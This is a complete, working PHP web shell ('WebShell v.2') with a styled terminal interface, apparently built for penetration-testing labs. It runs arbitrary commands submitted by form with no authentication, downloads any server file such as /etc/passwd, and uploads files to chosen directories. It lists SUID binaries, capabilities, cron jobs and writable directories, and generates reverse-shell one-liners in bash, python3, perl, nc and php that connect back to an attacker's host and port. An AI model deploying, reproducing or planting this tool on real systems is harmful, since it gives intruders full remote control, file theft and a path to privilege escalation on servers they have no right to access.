<?php
// File download — must run before any output
if (!empty($_POST['dl_path'])) {
    $dl = $_POST['dl_path'];
    if (file_exists($dl) && is_file($dl) && is_readable($dl)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dl) . '"');
        header('Content-Length: ' . filesize($dl));
        readfile($dl);
        exit;
    }
    $dl_error = 'File not found or not readable.';
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
/* ── Animations ── */
@keyframes scanlineScroll {
    0%   { background-position: 0 0; }
    100% { background-position: 0 3px; }
}
@keyframes termGlow {
    0%,100% { box-shadow: 0 0 6px #ff2200 inset; }
    50%      { box-shadow: 0 0 14px #ff2200 inset; }
}
@keyframes flicker {
    0%,100% { text-shadow: 0 0 4px #ffaaaa; }
    50%      { text-shadow: 0 0 10px #ffaaaa; }
}
@keyframes blink {
    0%,49%   { border-right-color: #ff2200; }
    50%,100% { border-right-color: transparent; }
}
@keyframes typewriter {
    from { width: 0; }
    to   { width: 100%; }
}

/* ── Base ── */
body {
    margin: 0;
    padding: 20px;
    min-height: 100vh;
    font-family: 'Courier New', Courier, monospace;
    font-size: 16px;
    line-height: 1.5;
    color: #ffaaaa;
    background: #000;
    display: flex;
    justify-content: center;
    align-items: flex-start;
}

/* scanlines */
body::before {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: repeating-linear-gradient(
        to bottom,
        rgba(255,30,0,0.04),
        rgba(255,30,0,0.04) 1px,
        transparent 1px,
        transparent 3px
    );
    pointer-events: none;
    z-index: 0;
    animation: scanlineScroll 0.4s linear infinite;
}

/* CRT vignette — stacks above scanlines via DOM order, below .pbp-container via stacking context */
body::after {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,0.85) 100%);
    pointer-events: none;
    z-index: 0;
}

/* ── Container ── */
.pbp-container {
    position: relative;
    z-index: 1;
    background: rgba(0,0,0,0.92);
    border: 2px solid #ff2200;
    border-radius: 8px;
    padding: 25px 35px;
    max-width: 800px;
    width: 90%;
    box-shadow: 0 0 28px rgba(255,34,0,0.45);
    animation: flicker 3s ease-in-out infinite;
}

/* ── Header / title ── */
.shell-title {
    color: #ff4422;
    font-weight: bold;
    font-size: 18px;
    overflow: hidden;
    white-space: nowrap;
    display: inline-block;
    width: 16ch;
    border-right: 2px solid #ff2200;
    animation: typewriter 1.4s steps(16,end) forwards,
               blink 0.75s step-end 1.4s 4 forwards;
}

/* ── Typography ── */
h1, h2, h3 {
    color: #ffaaaa;
    text-shadow: 0 0 6px #ffaaaa;
    margin: 0 0 12px 0;
}
p  { margin-bottom: 12px; }
a  { color: #ffaaaa; text-decoration: underline; }
a:hover { color: #ffcccc; text-shadow: 0 0 6px #ffcccc; }

/* ── Buttons ── */
button, input[type=submit] {
    background: #000;
    color: #ffaaaa;
    border: 2px solid #ffaaaa;
    border-radius: 6px;
    padding: 10px 18px;
    cursor: pointer;
    box-shadow: 0 0 8px rgba(255,170,170,0.4);
    font-family: 'Courier New', monospace;
    transition: all 0.2s ease;
}
button:hover, input[type=submit]:hover {
    box-shadow: 0 0 16px rgba(255,170,170,0.75);
    transform: translateY(-1px);
}

/* ── Inputs ── */
input[type=text], input[type=number], input[type=password] {
    background: #000;
    color: #ffaaaa;
    border: 1px solid #ff2200;
    padding: 5px 8px;
    font-family: 'Courier New', monospace;
    border-radius: 4px;
}

/* ── Command prompt label ── */
.cmd-label {
    display: inline-block;
    color: #ff2200;
    font-weight: bold;
    margin-bottom: 6px;
}
.cmd-label::after {
    content: '_';
    animation: blink 1s step-end infinite;
}

/* ── Terminal output block ── */
.retro-terminal {
    margin-top: 15px;
    border: 2px solid #ff2200;
    background: #000;
    border-radius: 6px;
    overflow: hidden;
    background-image:
        linear-gradient(rgba(255,30,0,0.04) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,30,0,0.02) 1px, transparent 1px);
    background-size: 100% 3px, 3px 100%;
    animation: termGlow 3s ease-in-out infinite;
}
.retro-terminal-header {
    background: #ff2200;
    color: #000;
    padding: 6px 10px;
    font-family: Consolas, monospace;
    font-weight: bold;
    border-bottom: 2px solid #ff2200;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.retro-terminal-body {
    padding: 10px;
    color: #ff4422;
    font-family: Consolas, monospace;
    text-shadow: 0 0 5px #ff2200;
    white-space: pre-wrap;
}

/* ── code / pre ── */
code, pre {
    background: rgba(255,30,0,0.05);
    padding: 4px 8px;
    border-radius: 4px;
    font-family: 'Courier New', monospace;
    color: #ffaaaa;
    text-shadow: 0 0 4px #ffaaaa;
}

/* ── Output block (sysinfo / upload result) ── */
.output-block {
    background-color: #0a0000;
    color: #ffaaaa;
    padding: 15px;
    margin: 8px 0;
    border-radius: 8px;
    font-family: monospace;
    border: 1px solid #3a0000;
}

/* ── Copy button ── */
.copy-btn {
    background: #000;
    color: #ff2200;
    border: 1px solid #ff2200;
    border-radius: 4px;
    padding: 2px 10px;
    cursor: pointer;
    font-family: monospace;
    font-size: 12px;
    box-shadow: none;
    transform: none;
}
.copy-btn:hover {
    background: #ff2200;
    color: #000;
    transform: none;
    box-shadow: none;
}

/* ── Reverse shell buttons ── */
.revshell-btn {
    background: #000;
    color: #ff6600;
    border: 1px solid #ff6600;
    border-radius: 4px;
    padding: 5px 12px;
    cursor: pointer;
    font-family: monospace;
    font-size: 13px;
    margin: 3px;
    box-shadow: none;
    transition: all 0.15s;
}
.revshell-btn:hover {
    background: #ff6600;
    color: #000;
    transform: none;
    box-shadow: none;
}

/* ── Collapsible sysinfo ── */
details {
    margin: 6px 0;
    border: 1px solid #3a0000;
    border-radius: 4px;
    background: #080000;
}
details[open] {
    border-color: #ff2200;
}
summary {
    cursor: pointer;
    padding: 6px 10px;
    color: #ff4422;
    font-weight: bold;
    list-style: none;
    user-select: none;
}
summary::before {
    content: '▶ ';
    font-size: 11px;
}
details[open] summary::before {
    content: '▼ ';
}
summary:hover { color: #ff6644; }
details .output-block {
    margin: 0;
    border-radius: 0 0 4px 4px;
    border-top: 1px solid #3a0000;
}

/* ── Fieldsets ── */
fieldset {
    border-radius: 5px;
    background: #000;
    padding: 15px;
    margin-bottom: 16px;
}
</style>
</head>
<body>

<div class="pbp-container">

<span class="shell-title">WebShell v.2 &lt;:~</span><br><br>

<!-- ── Command execution ── -->
<fieldset style="border:2px solid #ff2200;">

<form id="cmd-form" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>" method="post">
<span class="cmd-label">root@shell:~$&nbsp;</span><br>
<input type="text" id="command" name="command" style="width:70%;" autocomplete="off"
    value="<?php echo htmlspecialchars($_POST['command'] ?? '', ENT_QUOTES, 'UTF-8'); ?>" />
<input type="submit" value="Run" />

<?php if (!empty($_POST['command'])) : ?>
    <div class="retro-terminal">
        <div class="retro-terminal-header">
            <span>output</span>
            <button type="button" class="copy-btn" onclick="copyOutput()">copy</button>
        </div>
        <div class="retro-terminal-body" id="cmd-output">
<?php echo htmlspecialchars(shell_exec($_POST['command']), ENT_QUOTES, 'UTF-8'); ?>
        </div>
    </div>
<?php endif; ?>
</form>

<br>

<!-- ── Reverse shell launchers ── -->
<b style="color:#ff4422;">Reverse Shells</b><br>
<?php
$tun0_ip = trim(shell_exec("ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print \$2}' | cut -d/ -f1"));
if (empty($tun0_ip)) $tun0_ip = '';
?>
<div style="margin:8px 0;">
    LHOST: <input type="text" id="rs-ip" value="<?php echo htmlspecialchars($tun0_ip, ENT_QUOTES, 'UTF-8'); ?>"
        style="width:140px;" placeholder="10.10.14.x" />
    &nbsp;LPORT: <input type="number" id="rs-port" value="4444" style="width:70px;" />
    <br><br>
    <button type="button" class="revshell-btn" onclick="setShell('bash')">bash</button>
    <button type="button" class="revshell-btn" onclick="setShell('python3')">python3</button>
    <button type="button" class="revshell-btn" onclick="setShell('perl')">perl</button>
    <button type="button" class="revshell-btn" onclick="setShell('nc')">nc mkfifo</button>
    <button type="button" class="revshell-btn" onclick="setShell('php')">php</button>
</div>

</fieldset>

<!-- ── System Info ── -->
<fieldset style="border:2px solid #661100;">
<b style="color:#ff4422;">System Info</b>
<br><br>

<details>
<summary>Kernel &amp; OS</summary>
<div class="output-block"><pre><?php
echo htmlspecialchars(shell_exec("uname -a; awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release"), ENT_QUOTES, 'UTF-8');
?></pre></div>
</details>

<details>
<summary>User</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("whoami; id"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>Connected Users</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("who -u"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>Network Interfaces</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print \$2}' | grep -v 127"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>Listening Ports</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>Cron Jobs</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>SUIDs</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("find / -xdev -perm -4000 -type f 2>/dev/null | head -100"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>Capabilities</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("getcap -r / 2>/dev/null | head -100"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>Disks</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("df -h"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

</fieldset>

<!-- ── File Operations ── -->
<fieldset style="border:2px solid #661100;">
<b style="color:#ff4422;">File Operations</b><br><br>

<form style="display:inline-block;vertical-align:top;color:#ffaaaa;margin-right:40px;"
    action="" method="POST" enctype="multipart/form-data">
<b>Upload</b><br>
Destination path:<br>
<input type="text" name="upload" placeholder="/var/www/html/" style="width:220px;" /><br><br>
<input type="file" name="file" /><br><br>
<input type="submit" value="Upload" />

<details style="margin-top:12px;">
<summary>Current dir</summary>
<div class="output-block"><pre><?php echo htmlspecialchars(shell_exec("pwd"), ENT_QUOTES, 'UTF-8'); ?></pre></div>
</details>

<details>
<summary>Writable dirs</summary>
<div class="output-block"><pre><?php
echo htmlspecialchars(shell_exec(
    "find / -xdev \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) " .
    "-prune -o -type d -perm -0002 -print 2>/dev/null"
), ENT_QUOTES, 'UTF-8');
?></pre></div>
</details>
</form>

<form style="display:inline-block;vertical-align:top;color:#ffaaaa;" action="" method="POST">
<b>Download</b><br>
Remote file path:<br>
<input type="text" name="dl_path" placeholder="/etc/passwd" style="width:220px;" /><br><br>
<input type="submit" value="Download" />
<?php if (!empty($dl_error)) echo '<p style="color:#ff5555;">' . htmlspecialchars($dl_error, ENT_QUOTES, 'UTF-8') . '</p>'; ?>
</form>

</fieldset>

<?php if (!empty($_FILES['file'])) :
    $file_name = $_FILES['file']['name'];
    $file_tmp  = $_FILES['file']['tmp_name'];
    $dest_dir  = rtrim($_POST['upload'], '/') . '/';
    if (!empty($_POST['upload']) && is_dir($_POST['upload'])) {
        if (move_uploaded_file($file_tmp, $dest_dir . $file_name)) {
            echo '<div class="output-block">';
            echo 'Uploaded: ' . htmlspecialchars($file_name, ENT_QUOTES, 'UTF-8') . '<br>';
            echo 'Size: ' . round($_FILES['file']['size'] / 1024, 2) . ' KB<br>';
            echo 'Stored in: ' . htmlspecialchars($dest_dir, ENT_QUOTES, 'UTF-8');
            echo '</div>';
        } else {
            echo '<p style="color:#ff5555;">Upload failed (permissions or disk full).</p>';
        }
    } else {
        echo '<p style="color:#ff5555;">Invalid or missing upload path.</p>';
    }
endif; ?>

</div><!-- .pbp-container -->

<script>
// Command history
var cmdHistory = JSON.parse(localStorage.getItem('ws_history') || '[]');
var histIdx = -1;
var cmdInput = document.getElementById('command');

document.getElementById('cmd-form').addEventListener('submit', function() {
    var val = cmdInput.value.trim();
    if (val && cmdHistory[0] !== val) {
        cmdHistory.unshift(val);
        if (cmdHistory.length > 50) cmdHistory.pop();
        localStorage.setItem('ws_history', JSON.stringify(cmdHistory));
    }
});

cmdInput.addEventListener('keydown', function(e) {
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (histIdx < cmdHistory.length - 1) histIdx++;
        cmdInput.value = cmdHistory[histIdx] || '';
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        histIdx = Math.max(-1, histIdx - 1);
        cmdInput.value = histIdx >= 0 ? cmdHistory[histIdx] : '';
    }
});

// Copy output
function copyOutput() {
    var el = document.getElementById('cmd-output');
    if (!el) return;
    navigator.clipboard.writeText(el.innerText).catch(function() {
        var r = document.createRange();
        r.selectNode(el);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(r);
        document.execCommand('copy');
        window.getSelection().removeAllRanges();
    });
}

// Reverse shell launchers
function setShell(type) {
    var ip   = document.getElementById('rs-ip').value.trim();
    var port = document.getElementById('rs-port').value.trim();
    if (!ip || !port) { alert('Set LHOST and LPORT first.'); return; }
    var shells = {
        bash:    "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'",
        python3: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        perl:    "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
        nc:      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc " + ip + " " + port + " >/tmp/f",
        php:     "php -r '$s=fsockopen(\"" + ip + "\"," + port + ");$p=proc_open(\"/bin/bash -i\",[0=>$s,1=>$s,2=>$s],$pi);'"
    };
    document.getElementById('command').value = shells[type];
    document.getElementById('command').focus();
}
</script>

</body>
</html>
